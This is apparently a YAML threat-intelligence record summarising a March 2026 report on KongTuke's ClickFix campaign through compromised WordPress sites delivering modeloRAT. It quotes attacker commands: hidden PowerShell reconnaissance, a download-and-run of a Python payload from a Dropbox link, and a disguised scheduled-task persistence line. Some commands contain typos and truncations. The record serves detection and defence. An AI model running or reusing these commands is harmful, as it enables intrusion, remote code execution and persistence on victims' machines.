@@ -1,0 +1,29 @@
+description: 'MalwareThrough the Lens of MDR: Analysis of KongTukes ClickFix Abuse
+  of Compromised WordPress Sites'
+attribution: KongTuke
+malware_families: '[''modeloRAT'']'
+TTPs:
+  processes:
+  - powershell.exe
+  - cmd.exe
+  commandline:
+  - powershell -Noninteractive -NoProfile -WindowStyle Hidden -Command "Get-NetTCPConnection| Select-Object LocalAddress, LocalPort, RemoteAddress, RematePort, State | ConvertTo-Json"
+  - powershell -Noninteractive -NoProfile -WindowStyle Hidden -Command "whoami /all"
+  - powershell -Noninteractive -NoProfile -WindowStyle Hidden -Command Get-NetiPConfiguration | Select-Object InterfaceAlias, IPv4Address, DNSServer | ConvertTo-Json
+  - powershell -Noninteractive -NoProfile -WindowStyle Hidden -Command "Get-Volume | Select-Object DriveLetter, FileSystemlabel, Size, SizeRemaining | ConvertTo-Json"
+  - powershell -Noninteractive -NoProfile -WindowStyle Hidden -Command Get-Process| Select-Object Id, ProcessName, CPU, WorkingSet, Path | ConvertTo-Json
+  - powershell -Noninteractive -NoProfile -WindowStyle Hidden -Command Get-Computerinfo | Select-Object WindowsProductName, WindowsVersion, TotalPhysicalMemeary, CsProcessors | ConvertTo-l... powershell -Noninteractive -NoProfile -WindowStyle Hidden -Command "(Get-Cimlnstance Win32_ComputesSystem).Domain"
+  - powershell -Noninteractive -NoProfile -WindowStyle Hidden -Command $i=[Security.Principal.WindowsIdentity]::GetCurrent();if($i.IsSystem){SYSTEM }elseif{([Security.Principal.WindowsPrincipal]$i).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)}
+  -  -NonInteractive -NoProfile -WindowStyle Hidden -Command "iwr -Uri 'https://www.dropbox.com/scl/fi/np4h0kexqq5r9vlpzwg4d/rp?rlkey=fwg1koexylntccobyxaliju7w&st=3wxzp44k&dl=1' -OutFile \"$env:appdata\WPy64-31401\python\extentions.py\"; ls \"$env:appdata\WPy64-31401\python\"; Start-Process -FilePath \"$env:appdata\WPy64-31401\python\pythonw.exe\" -ArgumentList \"$env:appdata\WPy64-31401\python\extentions.py\";"
+  - C:\Windows\system32\schtasks.exe /create /tn SoftwareProtection /tr ""C:\Users\<USERNAME>\AppData\Local\Microsoft\Windows\SoftwareProtectionPlatform\run.exe" "C:\Users\<USERNAME>\AppData\Local\Microsoft\Windows\SoftwareProtectionPlatform\udp.pyw"" /sc minute /mo 5 /f
+CVEs: '[]'
+IOCs: 'hashes: []'
+authors: 
+- Aira Marcelo
+- Jovit Samaniego
+- Ryan Maglaque
+- Fe Cureg
+- Lisa Wu
+reference: https://www.trendmicro.com/en_us/research/26/c/kongtuke-clickfix-abuse-of-compromised-wordpress-sites.html
+date_of_publication: March 10, 2026
+file_creation_date: March 14, 2026
